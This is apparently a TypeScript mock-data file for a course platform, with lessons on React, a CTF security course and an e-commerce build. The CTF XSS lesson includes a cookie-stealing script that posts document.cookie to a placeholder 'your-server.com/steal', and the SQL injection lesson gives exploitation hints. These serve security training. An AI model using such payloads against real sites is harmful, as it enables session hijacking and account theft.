import type { Module, Lesson, QuizQuestion } from '@/types';

// Mock content for React Development Bootcamp (Course ID: 1)
export const reactCourseModules: Module[] = [
  {
    id: 'react-module-1',
    course_id: '1',
    title: 'React Fundamentals',
    description: 'Learn the core concepts of React including components, props, and state.',
    order_index: 1,
    is_published: true,
    created_at: '2024-01-15T10:00:00Z',
    updated_at: '2024-01-15T10:00:00Z',
  },
  {
    id: 'react-module-2',
    course_id: '1',
    title: 'React Hooks Deep Dive',
    description: 'Master React hooks including useState, useEffect, useContext, and custom hooks.',
    order_index: 2,
    is_published: true,
    created_at: '2024-01-15T10:00:00Z',
    updated_at: '2024-01-15T10:00:00Z',
  },
  {
    id: 'react-module-3',
    course_id: '1',
    title: 'State Management & Context',
    description: 'Learn advanced state management patterns and React Context API.',
    order_index: 3,
    is_published: true,
    created_at: '2024-01-15T10:00:00Z',
    updated_at: '2024-01-15T10:00:00Z',
  },
  {
    id: 'react-module-4',
    course_id: '1',
    title: 'React Router & Navigation',
    description: 'Implement client-side routing and navigation in React applications.',
    order_index: 4,
    is_published: true,
    created_at: '2024-01-15T10:00:00Z',
    updated_at: '2024-01-15T10:00:00Z',
  },
];

export const reactCourseLessons: Lesson[] = [
  // Module 1 Lessons
  {
    id: 'react-lesson-1',
    module_id: 'react-module-1',
    title: 'Introduction to React',
    description: 'What is React and why should you learn it? Understanding the virtual DOM and component-based architecture.',
    content_type: 'video',
    content_url: 'https://example.com/react-intro.mp4',
    content_text: `# Introduction to React

React is a JavaScript library for building user interfaces, particularly web applications. It was created by Facebook and is now maintained by Meta and the open-source community.

## Key Concepts:
- **Component-Based**: Build encapsulated components that manage their own state
- **Virtual DOM**: Efficient updates through a virtual representation of the DOM
- **Declarative**: Describe what the UI should look like for any given state
- **Learn Once, Write Anywhere**: Use React for web, mobile, and desktop applications

## Why React?
1. **Performance**: Virtual DOM enables efficient updates
2. **Reusability**: Components can be reused across different parts of your application
3. **Developer Experience**: Great tooling and debugging capabilities
4. **Community**: Large ecosystem and community support`,
    duration_minutes: 15,
    order_index: 1,
    is_published: true,
    created_at: '2024-01-15T10:00:00Z',
    updated_at: '2024-01-15T10:00:00Z',
  },
  {
    id: 'react-lesson-2',
    module_id: 'react-module-1',
    title: 'Creating Your First Component',
    description: 'Learn how to create and use React components with JSX syntax.',
    content_type: 'video',
    content_url: 'https://example.com/first-component.mp4',
    content_text: `# Creating Your First Component

Components are the building blocks of React applications. Let's create your first component!

## Function Components

\`\`\`jsx
function Welcome(props) {
  return <h1>Hello, {props.name}!</h1>;
}

// Or using arrow function
const Welcome = (props) => {
  return <h1>Hello, {props.name}!</h1>;
};
\`\`\`

## Using Components

\`\`\`jsx
function App() {
  return (
    <div>
      <Welcome name="Alice" />
      <Welcome name="Bob" />
      <Welcome name="Charlie" />
    </div>
  );
}
\`\`\`

## JSX Rules
1. Return a single parent element
2. Use className instead of class
3. Close all tags
4. Use camelCase for attributes`,
    duration_minutes: 20,
    order_index: 2,
    is_published: true,
    created_at: '2024-01-15T10:00:00Z',
    updated_at: '2024-01-15T10:00:00Z',
  },
  {
    id: 'react-lesson-3',
    module_id: 'react-module-1',
    title: 'Props and State Quiz',
    description: 'Test your understanding of React props and state management.',
    content_type: 'quiz',
    duration_minutes: 10,
    order_index: 3,
    is_published: true,
    created_at: '2024-01-15T10:00:00Z',
    updated_at: '2024-01-15T10:00:00Z',
  },
  // Module 2 Lessons
  {
    id: 'react-lesson-4',
    module_id: 'react-module-2',
    title: 'useState Hook',
    description: 'Master the useState hook for managing component state.',
    content_type: 'video',
    content_url: 'https://example.com/usestate-hook.mp4',
    content_text: `# useState Hook

The useState hook allows you to add state to functional components.

## Basic Usage

\`\`\`jsx
import React, { useState } from 'react';

function Counter() {
  const [count, setCount] = useState(0);

  return (
    <div>
      <p>You clicked {count} times</p>
      <button onClick={() => setCount(count + 1)}>
        Click me
      </button>
    </div>
  );
}
\`\`\`

## Multiple State Variables

\`\`\`jsx
function UserProfile() {
  const [name, setName] = useState('');
  const [email, setEmail] = useState('');
  const [age, setAge] = useState(0);

  // ... component logic
}
\`\`\`

## State with Objects

\`\`\`jsx
function UserForm() {
  const [user, setUser] = useState({
    name: '',
    email: '',
    age: 0
  });

  const updateUser = (field, value) => {
    setUser(prevUser => ({
      ...prevUser,
      [field]: value
    }));
  };
}
\`\`\``,
    duration_minutes: 25,
    order_index: 1,
    is_published: true,
    created_at: '2024-01-15T10:00:00Z',
    updated_at: '2024-01-15T10:00:00Z',
  },
  {
    id: 'react-lesson-5',
    module_id: 'react-module-2',
    title: 'useEffect Hook',
    description: 'Learn how to handle side effects in React components.',
    content_type: 'video',
    content_url: 'https://example.com/useeffect-hook.mp4',
    content_text: `# useEffect Hook

The useEffect hook lets you perform side effects in functional components.

## Basic Usage

\`\`\`jsx
import React, { useState, useEffect } from 'react';

function Example() {
  const [count, setCount] = useState(0);

  // Similar to componentDidMount and componentDidUpdate:
  useEffect(() => {
    document.title = \`You clicked \${count} times\`;
  });

  return (
    <div>
      <p>You clicked {count} times</p>
      <button onClick={() => setCount(count + 1)}>
        Click me
      </button>
    </div>
  );
}
\`\`\`

## Effect with Cleanup

\`\`\`jsx
useEffect(() => {
  const timer = setInterval(() => {
    console.log('Timer tick');
  }, 1000);

  // Cleanup function
  return () => {
    clearInterval(timer);
  };
}, []); // Empty dependency array means this runs once
\`\`\`

## Conditional Effects

\`\`\`jsx
useEffect(() => {
  fetchUserData(userId);
}, [userId]); // Only re-run when userId changes
\`\`\``,
    duration_minutes: 30,
    order_index: 2,
    is_published: true,
    created_at: '2024-01-15T10:00:00Z',
    updated_at: '2024-01-15T10:00:00Z',
  },
];

// Mock content for Cybersecurity CTF Challenges (Course ID: 2)
export const ctfCourseModules: Module[] = [
  {
    id: 'ctf-module-1',
    course_id: '2',
    title: 'Web Application Security',
    description: 'Learn to identify and exploit common web vulnerabilities.',
    order_index: 1,
    is_published: true,
    created_at: '2024-01-10T14:30:00Z',
    updated_at: '2024-01-10T14:30:00Z',
  },
  {
    id: 'ctf-module-2',
    course_id: '2',
    title: 'Cryptography Challenges',
    description: 'Master cryptographic concepts through hands-on challenges.',
    order_index: 2,
    is_published: true,
    created_at: '2024-01-10T14:30:00Z',
    updated_at: '2024-01-10T14:30:00Z',
  },
  {
    id: 'ctf-module-3',
    course_id: '2',
    title: 'Binary Exploitation',
    description: 'Learn buffer overflows, ROP chains, and memory corruption.',
    order_index: 3,
    is_published: true,
    created_at: '2024-01-10T14:30:00Z',
    updated_at: '2024-01-10T14:30:00Z',
  },
];

export const ctfCourseLessons: Lesson[] = [
  {
    id: 'ctf-lesson-1',
    module_id: 'ctf-module-1',
    title: 'SQL Injection Challenge',
    description: 'Exploit SQL injection vulnerabilities to extract sensitive data.',
    content_type: 'code_challenge',
    content_text: `# SQL Injection Challenge

## Objective
Your goal is to extract the admin password from the vulnerable login form.

## Challenge Description
You've discovered a login form that appears to be vulnerable to SQL injection. The application uses the following query:

\`\`\`sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
\`\`\`

## Your Mission
1. Identify the SQL injection vulnerability
2. Bypass the authentication mechanism
3. Extract the admin user's password from the database

## Hints
- Try using single quotes to break out of the SQL query
- Consider using UNION SELECT to extract data
- The users table has columns: id, username, password, email

## Flag Format
The flag will be in the format: \`CTF{extracted_password}\`

## Challenge Environment
Access the vulnerable application at: https://ctf-lab.example.com/sqli-1

Good luck, and remember: only test on authorized systems!`,
    duration_minutes: 45,
    order_index: 1,
    is_published: true,
    created_at: '2024-01-10T14:30:00Z',
    updated_at: '2024-01-10T14:30:00Z',
  },
  {
    id: 'ctf-lesson-2',
    module_id: 'ctf-module-1',
    title: 'Cross-Site Scripting (XSS)',
    description: 'Learn to identify and exploit XSS vulnerabilities.',
    content_type: 'code_challenge',
    content_text: `# Cross-Site Scripting (XSS) Challenge

## Objective
Execute JavaScript code in the context of another user's browser session.

## Challenge Description
You've found a comment system that doesn't properly sanitize user input. Your goal is to inject JavaScript that will steal the admin's session cookie.

## Your Mission
1. Find the XSS vulnerability in the comment system
2. Craft a payload that steals cookies
3. Capture the admin's session token

## Payload Ideas
\`\`\`javascript
<script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">
<svg onload="alert('XSS')">
\`\`\`

## Advanced Payload
\`\`\`javascript
<script>
fetch('https://your-server.com/steal', {
  method: 'POST',
  body: document.cookie
});
</script>
\`\`\`

## Challenge Environment
Access the vulnerable application at: https://ctf-lab.example.com/xss-1`,
    duration_minutes: 40,
    order_index: 2,
    is_published: true,
    created_at: '2024-01-10T14:30:00Z',
    updated_at: '2024-01-10T14:30:00Z',
  },
];

// Mock content for Full-Stack E-commerce App (Course ID: 3)
export const ecommerceCourseModules: Module[] = [
  {
    id: 'ecommerce-module-1',
    course_id: '3',
    title: 'Project Setup & Architecture',
    description: 'Set up the development environment and plan the application architecture.',
    order_index: 1,
    is_published: true,
    created_at: '2024-01-05T09:15:00Z',
    updated_at: '2024-01-05T09:15:00Z',
  },
  {
    id: 'ecommerce-module-2',
    course_id: '3',
    title: 'Backend API Development',
    description: 'Build RESTful APIs with Node.js, Express, and MongoDB.',
    order_index: 2,
    is_published: true,
    created_at: '2024-01-05T09:15:00Z',
    updated_at: '2024-01-05T09:15:00Z',
  },
  {
    id: 'ecommerce-module-3',
    course_id: '3',
    title: 'Frontend Development',
    description: 'Create a responsive React frontend with modern UI components.',
    order_index: 3,
    is_published: true,
    created_at: '2024-01-05T09:15:00Z',
    updated_at: '2024-01-05T09:15:00Z',
  },
  {
    id: 'ecommerce-module-4',
    course_id: '3',
    title: 'Payment Integration',
    description: 'Integrate Stripe for secure payment processing.',
    order_index: 4,
    is_published: true,
    created_at: '2024-01-05T09:15:00Z',
    updated_at: '2024-01-05T09:15:00Z',
  },
];

export const ecommerceCourseLessons: Lesson[] = [
  {
    id: 'ecommerce-lesson-1',
    module_id: 'ecommerce-module-1',
    title: 'Project Requirements & Planning',
    description: 'Define the project scope and technical requirements.',
    content_type: 'text',
    content_text: `# E-commerce Project Requirements

## Project Overview
We'll build a full-featured e-commerce platform with the following capabilities:

### Core Features
- **Product Management**: CRUD operations for products
- **User Authentication**: Registration, login, and profile management
- **Shopping Cart**: Add, remove, and modify cart items
- **Order Processing**: Checkout flow and order management
- **Payment Integration**: Secure payments with Stripe
- **Admin Dashboard**: Manage products, orders, and users

### Technical Stack
- **Frontend**: React with TypeScript
- **Backend**: Node.js with Express
- **Database**: MongoDB with Mongoose
- **Authentication**: JWT tokens
- **Payments**: Stripe API
- **Deployment**: Docker containers

### Database Schema
\`\`\`javascript
// User Schema
{
  _id: ObjectId,
  email: String,
  password: String (hashed),
  firstName: String,
  lastName: String,
  role: String, // 'customer' | 'admin'
  addresses: [AddressSchema],
  createdAt: Date
}

// Product Schema
{
  _id: ObjectId,
  name: String,
  description: String,
  price: Number,
  category: String,
  images: [String],
  inventory: Number,
  isActive: Boolean,
  createdAt: Date
}

// Order Schema
{
  _id: ObjectId,
  userId: ObjectId,
  items: [OrderItemSchema],
  totalAmount: Number,
  status: String, // 'pending' | 'paid' | 'shipped' | 'delivered'
  shippingAddress: AddressSchema,
  paymentId: String,
  createdAt: Date
}
\`\`\``,
    duration_minutes: 20,
    order_index: 1,
    is_published: true,
    created_at: '2024-01-05T09:15:00Z',
    updated_at: '2024-01-05T09:15:00Z',
  },
  {
    id: 'ecommerce-lesson-2',
    module_id: 'ecommerce-module-2',
    title: 'Setting up Express Server',
    description: 'Create the backend server with Express and middleware setup.',
    content_type: 'code_challenge',
    content_text: `# Express Server Setup

## Objective
Set up a robust Express.js server with proper middleware and error handling.

## Your Task
Create an Express server with the following requirements:

### 1. Basic Server Setup
\`\`\`javascript
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(helmet()); // Security headers
app.use(cors()); // Enable CORS
app.use(morgan('combined')); // Logging
app.use(express.json({ limit: '10mb' })); // Parse JSON bodies
app.use(express.urlencoded({ extended: true })); // Parse URL-encoded bodies

// Routes
app.get('/api/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ error: 'Something went wrong!' });
});

app.listen(PORT, () => {
  console.log(\`Server running on port \${PORT}\`);
});
\`\`\`

### 2. Database Connection
\`\`\`javascript
const mongoose = require('mongoose');

const connectDB = async () => {
  try {
    await mongoose.connect(process.env.MONGODB_URI, {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    });
    console.log('MongoDB connected successfully');
  } catch (error) {
    console.error('Database connection failed:', error);
    process.exit(1);
  }
};

connectDB();
\`\`\`

### 3. Environment Variables
Create a \`.env\` file:
\`\`\`
NODE_ENV=development
PORT=5000
MONGODB_URI=mongodb://localhost:27017/ecommerce
JWT_SECRET=your-super-secret-jwt-key
STRIPE_SECRET_KEY=sk_test_...
\`\`\`

## Testing
Test your server by running:
\`\`\`bash
npm start
curl http://localhost:5000/api/health
\`\`\`

Expected response:
\`\`\`json
{
  "status": "OK",
  "timestamp": "2024-01-05T10:30:00.000Z"
}
\`\`\``,
    duration_minutes: 35,
    order_index: 1,
    is_published: true,
    created_at: '2024-01-05T09:15:00Z',
    updated_at: '2024-01-05T09:15:00Z',
  },
];

// Quiz questions for React course
export const reactQuizQuestions: QuizQuestion[] = [
  {
    id: 'react-quiz-1',
    lesson_id: 'react-lesson-3',
    question: 'What is the correct way to pass data from a parent component to a child component in React?',
    type: 'multiple_choice',
    options: [
      'Using state',
      'Using props',
      'Using context',
      'Using refs'
    ],
    correct_answer: 'Using props',
    explanation: 'Props (short for properties) are the mechanism for passing data from parent components to child components in React.',
    order_index: 1,
  },
  {
    id: 'react-quiz-2',
    lesson_id: 'react-lesson-3',
    question: 'Which hook is used to manage local component state in functional components?',
    type: 'multiple_choice',
    options: [
      'useEffect',
      'useState',
      'useContext',
      'useReducer'
    ],
    correct_answer: 'useState',
    explanation: 'The useState hook is specifically designed for managing local state in functional components.',
    order_index: 2,
  },
  {
    id: 'react-quiz-3',
    lesson_id: 'react-lesson-3',
    question: 'True or False: React components must return a single parent element.',
    type: 'true_false',
    correct_answer: 'true',
    explanation: 'React components must return a single parent element, though you can use React.Fragment or <> </> to avoid adding extra DOM nodes.',
    order_index: 3,
  },
];

// Combine all mock data
export const getAllMockModules = (): Module[] => [
  ...reactCourseModules,
  ...ctfCourseModules,
  ...ecommerceCourseModules,
];

export const getAllMockLessons = (): Lesson[] => [
  ...reactCourseLessons,
  ...ctfCourseLessons,
  ...ecommerceCourseLessons,
];

export const getAllMockQuizQuestions = (): QuizQuestion[] => [
  ...reactQuizQuestions,
];

// Helper functions to get content by course ID
export const getModulesByCourseId = (courseId: string): Module[] => {
  return getAllMockModules().filter(module => module.course_id === courseId);
};

export const getLessonsByModuleId = (moduleId: string): Lesson[] => {
  return getAllMockLessons().filter(lesson => lesson.module_id === moduleId);
};

export const getQuizQuestionsByLessonId = (lessonId: string): QuizQuestion[] => {
  return getAllMockQuizQuestions().filter(question => question.lesson_id === lessonId);
};